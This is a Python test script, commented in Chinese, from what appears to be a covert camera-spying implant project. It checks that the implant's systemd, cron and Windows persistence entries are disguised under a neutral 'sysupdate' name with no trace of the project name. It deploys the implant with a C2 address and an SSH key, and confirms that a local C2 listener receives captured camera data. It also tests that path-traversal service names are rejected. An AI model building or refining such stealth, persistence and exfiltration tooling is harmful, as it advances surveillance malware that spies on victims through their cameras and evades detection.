#!/usr/bin/env python3
"""
驻留服务名一致性 + 路径穿越守卫。

背景（实测撞出来的真缺陷）
--------------------------
部署侧（onekey.sh）早已把落点伪装成中性名 $NAME，而驻留段
（09_persistence/src/persist.c）里这些名字**全部硬编码项目名**：

    /etc/systemd/system/<项目名>.service
    /etc/cron.d/<项目名>
    com.<项目名>.agent                  （plist Label）
    Description=<项目名> agent
    reg add ... /v <项目名>Agent        （Windows Run 键）
    sc create <项目名>Agent             （Windows 服务）
    schtasks /create /tn <项目名>Agent  （Windows 计划任务）
    __EventFilter Name='dj'             （WMI）

两个名字不一致，在真机上是三重合失效**同时**发生，而部署报告仍是
"成功 N 失败 0"，没有任何一处会报错：

  1) 伪装失效：systemctl status / reg query / schtasks /query 一眼读出
     项目名。部署侧改名做了、驻留段没做，等于只伪装了一半。
  2) 双重驻留：部署脚本写 <中性名>.service，camd 内部 persist 又写
     <项目名>.service —— 两套 unit 同时被拉起，两个采集进程抢同一摄像头，
     句柄与内存持续增长，暴露面翻倍。
  3) 卸载残留：uninstall 只清中性名那套，项目名那套永远留着且仍在跑。

修复：服务名可配（persist_set_service_name），由部署侧单一产地决定。

新增攻击面（必须同时守住）
--------------------------
服务名会被拼进 "%s/etc/systemd/system/%s.service"。名字一旦可配，
接受任意字符串就等于**任意路径可写**：

    CAMD_SVC_NAME="../../../etc/cron.d/x"
    -> /etc/systemd/system/../../../etc/cron.d/x.service

所以字符集校验（[A-Za-z0-9_-]、首字符非 '-'、长度 1..63）不是洁癖，
是安全边界。本守卫对每条非法名都断言"被拒绝"。

场景
  F1 conf 带 CAMD_SVC_NAME
  F2 单元落点名 == NAME（不是项目名）
  F3 cron 落点名 == NAME
  F4 驻留痕迹不含项目名
  F5 部署输出呈现三段驻留状态
  F6 C2 实收 > 0（证明改名没把功能改坏）
  R1 含 '/'  的服务名被拒
  R2 含 '..' 的服务名被拒
  R3 去掉 conf 里的 CAMD_SVC_NAME -> 落点名回退项目名（证明 F2/F3 非恒绿）

退出 0 = 全过；非 0 = 有失败。
"""

import os
import re
import shutil
import socket
import subprocess
import sys
import tempfile
import threading

HERE = os.path.dirname(os.path.abspath(__file__))
MOD = os.path.dirname(HERE)              # 21_exfil
ROOT = os.path.dirname(MOD)              # dayanjing
CAMD = os.path.join(ROOT, 'agent_windows', 'build', 'linux', 'camd')
GEN = os.path.join(MOD, 'make_onekey.py')
ONEKEY = os.path.join(MOD, 'onekey.sh')

PROJECT = 'dayanjing'                    # 不该出现在驻留落点里的项目名

PASS = 0
FAIL = 0


def chk(cond, name, detail=''):
    global PASS, FAIL
    if cond:
        PASS += 1
        print('[OK] %s %s' % (name, detail))
    else:
        FAIL += 1
        print('[FAIL] %s %s' % (name, detail))
    return cond


class C2(object):
    """最小 TCP 收端：只统计实收字节，不解析内容。"""

    def __init__(self):
        self.n = 0
        self.conn = 0
        s = socket.socket()
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind(('127.0.0.1', 0))
        self.port = s.getsockname()[1]
        s.listen(8)
        self.srv = s
        t = threading.Thread(target=self._loop, daemon=True)
        t.start()

    def _loop(self):
        while True:
            try:
                c, _ = self.srv.accept()
            except Exception:
                return
            self.conn += 1
            threading.Thread(target=self._rd, args=(c,), daemon=True).start()

    def _rd(self, c):
        try:
            while True:
                b = c.recv(65536)
                if not b:
                    break
                self.n += len(b)
        except Exception:
            pass
        finally:
            try:
                c.close()
            except Exception:
                pass


def run(cmd, **kw):
    kw.setdefault('capture_output', True)
    kw.setdefault('text', True)
    return subprocess.run(cmd, **kw)


def gen_onekey(dst):
    r = run([sys.executable, GEN, 'amd64=%s' % CAMD, '-o', dst], timeout=180)
    return r.returncode == 0 and os.path.exists(dst)


def main():
    if not os.path.exists(CAMD):
        print('[FATAL] 缺产物 %s —— 先 make -C agent_windows' % CAMD)
        return 1
    if not os.path.exists(ONEKEY):
        print('[FATAL] 缺 onekey.sh')
        return 1

    work = tempfile.mkdtemp(prefix='svc_', dir='/data/workspace')
    ok = os.path.join(work, 'ok.sh')
    if not gen_onekey(ok):
        print('[FATAL] 生成一键脚本失败')
        return 1

    c2 = C2()
    root = os.path.join(work, 'pfx')
    os.makedirs(root, exist_ok=True)
    # 假根里造发行版特征：形态探测按 $PREFIX/etc 判定（部署脚本与 camd 内部
    # persist 同源）。空假根无特征会落到 /etc/crontab 回退形态，cron.d 目录
    # 根本不会建 —— F3 会拿到空列表，而"空列表不含项目名"是恒绿断言，
    # 于是只有 F3 变红、F3' 仍绿，看起来像部分通过，实则是两条都失效。
    os.makedirs(os.path.join(root, 'etc'), exist_ok=True)
    with open(os.path.join(root, 'etc', 'debian_version'), 'w') as f:
        f.write('12.4\n')
    pk = os.path.join(work, 'id.pub')
    with open(pk, 'w') as f:
        f.write('ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAISvcNameGuardKey'
                '0000000000000000000000000000 guard\n')

    r = run(['sh', ok, 'install', '--prefix', root, '--c2',
             '127.0.0.1:%d' % c2.port, '--backend', 'v4l2',
             '--ssh-pubkey', pk], timeout=240)
    out = (r.stdout or '') + (r.stderr or '')

    # 部署侧 NAME：从 conf 里读，不硬编码
    conf = os.path.join(root, 'etc', 'sysupdate', 'sysupdate.conf')
    name = None
    if os.path.exists(conf):
        for line in open(conf, encoding='utf-8', errors='replace'):
            if line.startswith('CAMD_SVC_NAME='):
                name = line.split('=', 1)[1].strip()
    if not name:
        print('[FATAL] 未能从 conf 读到 CAMD_SVC_NAME')
        return 1

    chk(True, 'F1 conf 带 CAMD_SVC_NAME', name)
    chk(name != PROJECT, 'F1 服务名不是项目名', name)

    # 驻留落点（--root 与 PREFIX 同源，落点就在 PREFIX 下）
    unit_dir = os.path.join(root, 'etc', 'systemd', 'system')
    cron_dir = os.path.join(root, 'etc', 'cron.d')
    units = os.listdir(unit_dir) if os.path.isdir(unit_dir) else []
    crons = os.listdir(cron_dir) if os.path.isdir(cron_dir) else []

    chk('%s.service' % name in units, 'F2 单元落点名 == NAME',
        str(units))
    chk(not any(PROJECT in u for u in units), 'F2 无项目名单元', str(units))
    chk(name in crons, 'F3 cron 落点名 == NAME', str(crons))
    chk(not any(PROJECT in c for c in crons), 'F3 无项目名 cron', str(crons))

    # F4：驻留痕迹内容里不含项目名
    dirty = []
    for base in (unit_dir, cron_dir):
        if not os.path.isdir(base):
            continue
        for fn in os.listdir(base):
            p = os.path.join(base, fn)
            if os.path.isfile(p):
                try:
                    body = open(p, encoding='utf-8', errors='replace').read()
                except Exception:
                    continue
                if PROJECT in body:
                    dirty.append(fn)
    chk(not dirty, 'F4 驻留痕迹内容不含项目名', str(dirty))

    chk('驻留三段' in out, 'F5 部署输出呈现三段驻留状态')
    chk(c2.n > 0, 'F6 C2 实收 > 0', '%d 字节' % c2.n)

    # ---- 路径穿越 / 非法字符集 ----
    key = os.urandom(32).hex()
    for bad, label in ((('a/b'), 'R1 含 /'), ('../evil', 'R2 含 ..'),
                       ('-lead', 'R2 首字符 -'), ('x' * 70, 'R2 超长')):
        env = dict(os.environ)
        env['CAMD_SINK'] = 'tcp://127.0.0.1:%d' % c2.port
        env['CAMD_KEY'] = key
        env['CAMD_SVC_NAME'] = bad
        rr = run([CAMD, '--batches', '1', '--frames', '1'], env=env,
                 timeout=90)
        chk(rr.returncode == 2 and 'CAMD_SVC_NAME 非法' in (rr.stderr or ''),
            label, 'rc=%d' % rr.returncode)

    # ---- R3 反向：去掉 CAMD_SVC_NAME，落点名必须回退项目名 ----
    # 证明 F2/F3 有鉴别力：若不回退，说明落点名根本不由 conf 决定，
    # 那 F2/F3 就是恒绿。
    root2 = os.path.join(work, 'pfx2')
    os.makedirs(root2, exist_ok=True)
    conf2 = os.path.join(root2, 'etc', 'sysupdate', 'sysupdate.conf')
    os.makedirs(os.path.dirname(conf2), exist_ok=True)
    with open(conf, encoding='utf-8') as f:
        src = f.read()
    with open(conf2, 'w', encoding='utf-8') as f:
        for line in src.splitlines():
            if not line.startswith('CAMD_SVC_NAME='):
                f.write(line + '\n')
    env = dict(os.environ)
    env['CAMD_SINK'] = 'tcp://127.0.0.1:%d' % c2.port
    env['CAMD_KEY'] = key
    env['CAMD_BACKEND'] = 'v4l2'
    env.pop('CAMD_SVC_NAME', None)
    # 直接对 conf2 跑：模拟"未配置服务名"的部署
    rr = run(['sh', '-c', 'set -a; . "%s"; set +a; exec "%s" --root "%s" '
              '--batches 1 --frames 1' % (conf2, CAMD, root2)],
             env=env, timeout=120)
    u2 = os.path.join(root2, 'etc', 'systemd', 'system')
    names2 = os.listdir(u2) if os.path.isdir(u2) else []
    chk(any(PROJECT in n for n in names2),
        'R3 去掉 CAMD_SVC_NAME 后落点名回退项目名（F2/F3 非恒绿）',
        str(names2))

    shutil.rmtree(work, ignore_errors=True)
    print('\ntotal=%d pass=%d fail=%d' % (PASS + FAIL, PASS, FAIL))
    return 0 if FAIL == 0 else 1


if __name__ == '__main__':
    sys.exit(main())
